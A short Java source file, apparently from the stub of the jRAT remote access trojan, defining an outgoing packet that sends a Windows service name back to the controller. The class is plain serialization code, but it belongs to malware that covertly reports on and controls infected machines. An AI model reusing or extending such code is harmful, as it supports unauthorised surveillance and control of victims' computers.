package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet52WindowsService extends AbstractOutgoingPacket {

	private String name;

	public Packet52WindowsService(String name) {
		this.name = name;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(name);
	}

	@Override
	public short getPacketId() {
		return 52;
	}

}
